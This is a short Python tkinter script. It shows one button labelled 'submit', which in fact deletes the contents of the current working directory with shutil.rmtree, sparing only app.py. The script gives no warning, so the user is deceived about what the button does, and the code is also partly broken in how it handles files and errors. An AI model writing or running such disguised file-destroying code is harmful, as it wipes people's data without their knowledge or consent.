import os
from tkinter import *
import shutil

windows = Tk()


def delete():
    try:
        path = os.getcwd()
        for file in os.listdir(path):
            if 'app.py' in file:
                pass
            else:
                shutil.rmtree(file)
                exit()
    except PermissionError:
        print('done')
        exit()


btn = Button(windows, text="submit", command=delete)
btn.pack()
windows.mainloop()

# Designed by philip nation's code